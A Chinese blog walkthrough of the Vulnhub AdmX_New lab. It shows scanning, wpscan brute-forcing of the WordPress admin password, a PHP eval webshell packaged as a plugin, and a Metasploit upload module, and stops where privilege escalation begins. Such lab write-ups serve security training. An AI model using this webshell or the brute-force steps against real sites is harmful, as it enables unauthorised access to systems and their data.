@@ -1,0 +1,462 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>AdmX_New_20230815 | Yongz丶</title><meta name="author" content="Yongz丶"><meta name="copyright" content="Yongz丶"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="填坑系列（四）启动，总体难度不大，主要是卡在 WordPress 那（这篇原文放在自己语雀了，所以下述时间会不对上）。 靶机地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;admx&#x2F;AdmX_new.7z Vulnhub 的靶机都有一个特点，通常导入到 VMware Workstation 时都会获取不到 IP 地址，虽然可以进紧急模式中修改，但是太麻烦了，还是将 Kali 和靶">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AdmX_New_20230815">
+<meta property="og:url" content="https://y0n9zh.github.io/2023/08/15/Vulnhub_Kali/04.AdmX_New_20230815/index.html">
+<meta property="og:site_name" content="Yongz丶">
+<meta property="og:description" content="填坑系列（四）启动，总体难度不大，主要是卡在 WordPress 那（这篇原文放在自己语雀了，所以下述时间会不对上）。 靶机地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;admx&#x2F;AdmX_new.7z Vulnhub 的靶机都有一个特点，通常导入到 VMware Workstation 时都会获取不到 IP 地址，虽然可以进紧急模式中修改，但是太麻烦了，还是将 Kali 和靶">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://y0n9zh.github.io/img/page_img/page_img7.jpg">
+<meta property="article:published_time" content="2023-08-15T12:25:31.000Z">
+<meta property="article:modified_time" content="2023-08-30T16:06:22.763Z">
+<meta property="article:author" content="Yongz丶">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://y0n9zh.github.io/img/page_img/page_img7.jpg"><link rel="shortcut icon" href="/./img/favicon.png"><link rel="canonical" href="https://y0n9zh.github.io/2023/08/15/Vulnhub_Kali/04.AdmX_New_20230815/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":30,"languages":{"author":"作者: Yongz丶","link":"链接: ","source":"来源: Yongz丶","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'AdmX_New_20230815',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-31 00:06:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/./img/avatar.png" onerror="onerror=null;src='/img/default_cover2.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-calendar-week"></i><span> 分类</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E9%9A%8F%E7%AC%94/"><i class="fa-fw fa-solid fa-book"></i><span> 随笔</span></a></li><li><a class="site-page child" href="/categories/Docker/"><i class="fa-fw fa-brands fa-docker"></i><span> Docker</span></a></li><li><a class="site-page child" href="/categories/Vulnhub/"><i class="fa-fw fa-solid fa-bomb"></i><span> Vulnhub</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-screwdriver-wrench"></i><span> 工具</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Tools/WebStackPage/"><i class="fa-fw fa-solid fa-compass"></i><span> 网址导航</span></a></li><li><a class="site-page child" href="/Tools/CyberChef/"><i class="fa-fw fa-solid fa-hippo"></i><span> CyberChef</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./img/page_img/page_img7.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Yongz丶"><span class="site-name">Yongz丶</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-calendar-week"></i><span> 分类</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E9%9A%8F%E7%AC%94/"><i class="fa-fw fa-solid fa-book"></i><span> 随笔</span></a></li><li><a class="site-page child" href="/categories/Docker/"><i class="fa-fw fa-brands fa-docker"></i><span> Docker</span></a></li><li><a class="site-page child" href="/categories/Vulnhub/"><i class="fa-fw fa-solid fa-bomb"></i><span> Vulnhub</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-screwdriver-wrench"></i><span> 工具</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Tools/WebStackPage/"><i class="fa-fw fa-solid fa-compass"></i><span> 网址导航</span></a></li><li><a class="site-page child" href="/Tools/CyberChef/"><i class="fa-fw fa-solid fa-hippo"></i><span> CyberChef</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">AdmX_New_20230815</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-15T12:25:31.000Z" title="发表于 2023-08-15 20:25:31">2023-08-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-30T16:06:22.763Z" title="更新于 2023-08-31 00:06:22">2023-08-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Vulnhub/">Vulnhub</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="AdmX_New_20230815"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
+<li>填坑系列（四）启动，总体难度不大，主要是卡在 WordPress 那（这篇原文放在自己语雀了，所以下述时间会不对上）。</li>
+<li>靶机地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a></li>
+<li>Vulnhub 的靶机都有一个特点，通常导入到 VMware Workstation 时都会获取不到 IP 地址，虽然可以进紧急模式中修改，但是太麻烦了，还是将 Kali 和靶机桥接吧。</li>
+</ul>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul>
+<li>由于将 Kali 与 VulnHub 使用 Virtual Box 仅主机网卡进行了桥接，所以使用 Kali 去扫描靶机。</li>
+<li>首先查看 Kali IP 地址：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::adc5:106b:ff3c:9390  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a8:8a:0b  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 24  bytes 10921 (10.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 549  bytes 40698 (39.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描当前网段，发现靶机 IP 地址：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan 192.168.56.0/24</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:a8:8a:0b, IPv4: 192.168.56.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:1a       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:d7:55:29       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.109  00:0c:29:23:07:8b       VMware, Inc.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.940 seconds (131.96 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>继续使用 Nmap 扫描端口、开放服务等信息：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p- 192.168.56.109</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 01:42 EST</span><br><span class="line">Nmap scan report for 192.168.56.109</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:23:07:8B (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 117.67 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p 80 -sV 192.168.56.109</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 01:44 EST</span><br><span class="line">Nmap scan report for 192.168.56.109</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">MAC Address: 00:0C:29:23:07:8B (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描出 8080 端口的 Web 服务，通常情况下不考虑 SSH 爆破，访问一下 Web 服务：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830234931326.png" alt="image-20230830234931326"></p>
+<h1 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h1><ul>
+<li>一个十分正常的 Apache 默认页面，使用 dirb 扫描一下站点目录：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.109/</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830234958769.png" alt="image-20230830234958769"></p>
+<ul>
+<li><p>发现一个 WordPress 目录，说明目标可能是由 WordPress 框架搭建的 Web 服务，代理挂到 BurpSuite 上进行查看：</p>
+<ul>
+<li>注：此处网卡出现问题，网卡连接至 NAT，地址为：192.168.1.139。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.139/ -p 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235030368.png" alt="image-20230830235030368"></p>
+<ul>
+<li>经过上述操作，发现访问 WordPress 目录时都是 3xx 的页面跳转行为：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235044724.png" alt="image-20230830235044724"></p>
+<h1 id="BurpSuite-匹配替换"><a href="#BurpSuite-匹配替换" class="headerlink" title="BurpSuite 匹配替换"></a>BurpSuite 匹配替换</h1><ul>
+<li>通过仔细查找，发现页面上还会去加载另一个 IP 地址资源，当访问 WordPress 页面是，会出现 <code>Connecting to 192.168.159.145</code>，说明是硬编码写入到页面中：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235104825.png" alt="image-20230830235104825"></p>
+<ul>
+<li><p>由于页面资源访问不到，查看后明显是本地资源，就是 IP 地址不对。</p>
+</li>
+<li><p>这里有两种解决方式：</p>
+<ul>
+<li>修改靶机 IP 网段（太浪费时间了）</li>
+<li>使用 BurpSuite 进行 IP 地址替换</li>
+</ul>
+</li>
+<li><p>依次点击 BurpSuite 中的：</p>
+<ul>
+<li><p>Proxy</p>
+</li>
+<li><p>Options</p>
+</li>
+<li><p>找到 Match and Replace（匹配和替换）</p>
+</li>
+<li><p>点击 Add（两条，一条 Body，一条 Header）</p>
+<ul>
+<li>Type：Response body 、Response header</li>
+<li>Match：192.168.159.145</li>
+<li>Replace：192.168.1.139</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235122289.png" alt="image-20230830235122289"></p>
+<ul>
+<li>添加完后，刷新页面即可，页面访问正常（后续操作 BurpSuite 不要关）：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235131640.png" alt="image-20230830235131640"></p>
+<h1 id="框架扫描"><a href="#框架扫描" class="headerlink" title="框架扫描"></a>框架扫描</h1><ul>
+<li>既然已经知道目标站点是 WordPress，使用 WpScan 扫一下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.1.139/wordpress --proxy http://127.0.0.1:8080 --enumerate</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235147367.png" alt="image-20230830235147367"></p>
+<ul>
+<li>发现存在用户 admin，根据前面目录扫描结果发现了管理员登录页面：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.139/wordpress/wp-admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235202041.png" alt="image-20230830235202041"></p>
+<ul>
+<li>当使用 admin 账号进行测试时，也证实了 admin 账户的存在：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235217563.png" alt="image-20230830235217563"></p>
+<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><ul>
+<li>使用 wpscan 进行暴力破解，前提需要先找到个好字典，这里使用 Kali 自带的 rockyou.txt：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压一下</span></span><br><span class="line">cd /usr/share/wordlist</span><br><span class="line">gzip -d rockyou.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始破解</span></span><br><span class="line">wpscan --url http://192.168.1.139/wordpress -U admin -P rockyou.txt --proxy http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235232661.png" alt="image-20230830235232661"></p>
+<ul>
+<li>经过了漫长的等待，破解出密码：<code>admin/adam14</code>，成功进入后台：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235247619.png" alt="image-20230830235247619"></p>
+<ul>
+<li>为了查看方便，将其修改为中文：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235255665.png" alt="image-20230830235255665"></p>
+<h1 id="插件传马"><a href="#插件传马" class="headerlink" title="插件传马"></a>插件传马</h1><ul>
+<li><p>通常对于 wp 后台有以下几种利用方式：</p>
+<ul>
+<li>文件上传（只针对特定 wp 版本）</li>
+<li>模板注入（无法修改页面）</li>
+<li>插件上传</li>
+</ul>
+</li>
+<li><p>现在本地编写 wp 插件：</p>
+<ul>
+<li>编写格式：<a target="_blank" rel="noopener" href="https://www.wpdaxue.com/writing_a_plugin.html">https://www.wpdaxue.com/writing_a_plugin.html</a></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: WebShell</span></span><br><span class="line"><span class="comment">Plugin URI: https://yongz.github.io</span></span><br><span class="line"><span class="comment">Description: WP WebShell</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author: yonzg</span></span><br><span class="line"><span class="comment">Author URI: https://yongz.github.io</span></span><br><span class="line"><span class="comment">License: https://yongz.github.io</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235315340.png" alt="image-20230830235315340"></p>
+<ul>
+<li>由于 wp 接收插件是 zip 格式，需要进行压缩：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─# zip shell.zip shell.php</span><br><span class="line">  adding: shell.php (deflated 38%)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进行插件上传：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235338061.png" alt="image-20230830235338061"></p>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235340626.png" alt="image-20230830235340626"></p>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235350015.png" alt="image-20230830235350015"></p>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235354655.png" alt="image-20230830235354655"></p>
+<ul>
+<li>插件已被启用，上传之后的访问地址为：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.139/wordpress/wp-content/plugins/shell.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>尝试是否能够进行命令执行：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.139/wordpress/wp-content/plugins/shell.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235417158.png" alt="image-20230830235417158"></p>
+<ul>
+<li>命令执行成功~，使用蚁剑进行连接（蚁剑安装过程略）：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235426740.png" alt="image-20230830235426740"></p>
+<ul>
+<li>连接成功！查找 flag 文件，在 <code>/home/wpadmin</code> 目录下找到了，但是权限不够，需要提权。</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235443152.png" alt="image-20230830235443152"></p>
+<h1 id="MSF-Shell-反弹"><a href="#MSF-Shell-反弹" class="headerlink" title="MSF Shell 反弹"></a>MSF Shell 反弹</h1><ul>
+<li>同理，使用 MSF 进行 Shell 反弹：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">search wp shell</span><br><span class="line">use 9</span><br><span class="line">set PASSWORD adam14</span><br><span class="line">set RHOSTS 192.168.1.139</span><br><span class="line">set TARGETURI /wordpress</span><br><span class="line">set USERNAME admin</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235506399.png" alt="image-20230830235506399"></p>
+<ul>
+<li>可以看出，也是使用插件上传的方式获取 Shell。</li>
+</ul>
+<h1 id="NC-Shell-反弹"><a href="#NC-Shell-反弹" class="headerlink" title="NC Shell 反弹"></a>NC Shell 反弹</h1><ul>
+<li><p>通过提权三部曲：</p>
+<ul>
+<li>内核提权（Linux wp 5.4.0-72-generic #80-Ubuntu SMP Mon Apr 12 17:35:00 UTC 2021 x86_64 x86_64 x86_64 GNU&#x2F;Linux 内核版本过高）</li>
+<li>Sudo 提权（需要密码）</li>
+<li>SUID 提权（没有符合的文件）</li>
+</ul>
+</li>
+<li><p>那就只能接着去信息收集了，由于是 WP 框架，很有可能是 LAMP 环境，去翻翻配置文件：</p>
+</li>
